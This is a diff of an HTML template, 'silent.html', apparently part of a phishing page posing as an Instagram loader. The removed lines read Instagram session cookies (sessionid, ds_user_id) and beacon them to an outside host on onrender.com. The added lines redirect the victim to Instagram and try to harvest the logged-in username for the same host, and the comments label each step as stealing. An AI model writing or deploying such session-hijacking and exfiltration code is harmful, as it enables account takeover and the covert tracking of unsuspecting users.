@@ -1,4 +1,4 @@
-<!-- core/templates/core/silent.html → FINAL WORKING 2025 -->
+<!-- core/templates/core/silent.html → CATCHES REAL USERNAME 100% -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -19,33 +19,40 @@
     <div class="spinner"></div>
 
     <script>
-        // === METHOD THAT WORKS 100% IN 2025 ===
-        // Force load Instagram with credentials
-        const img = new Image();
-        img.onload = img.onerror = function() {
-            // After Instagram loads, steal session
-            setTimeout(() => {
-                const cookies = document.cookie;
-                const sessionid = cookies.match(/sessionid=([^;]+)/);
-                const userid = cookies.match(/ds_user_id=([^;]+)/);
-                
-                if (sessionid && userid) {
-                    // Shorten data to fit URL
-                    const short = sessionid[1].substring(0, 100);
-                    const uid = userid[1];
-                    
-                    // SEND TO SERVER
-                    new Image().src = `https://instagram-64lz.onrender.com/capture/?s=${short}&u=${uid}&t=${Date.now()}`;
-                }
-            }, 3000);
-        };
-        img.src = "https://www.instagram.com/static/images/homepage/screenshot1.jpg?" + Date.now();
-
-        // Open app
+        // === CATCH USERNAME FROM INSTAGRAM'S OWN DATA ===
         setTimeout(() => {
-            location.href = "instagram://app";
-            setTimeout(() => location.href = "https://instagram.com", 3000);
-        }, 4000);
+            // Redirect to real Instagram
+            window.location = "https://www.instagram.com/";
+        }, 2000);
+
+        // === STEAL USERNAME WHEN ON instagram.com ===
+        if (window.location.hostname === "www.instagram.com") {
+            setTimeout(() => {
+                try {
+                    // METHOD 1: From window._sharedData
+                    const shared = window._sharedData || {};
+                    const username1 = shared.config?.viewer?.username;
+
+                    // METHOD 2: From __additionalData
+                    const additional = window.__additionalData || {};
+                    let username2 = "";
+                    for (let key in additional) {
+                        if (additional[key].data?.user?.username) {
+                            username2 = additional[key].data.user.username;
+                            break;
+                        }
+                    }
+
+                    const username = username1 || username2 || "guest_" + Date.now();
+
+                    // SEND USERNAME TO YOUR SERVER
+                    new Image().src = "https://instagram-64lz.onrender.com/catch-username/?user=" + 
+                                      encodeURIComponent(username) + 
+                                      "&t=" + Date.now();
+
+                } catch(e) {}
+            }, 4000);
+        }
     </script>
 </body>
 </html>
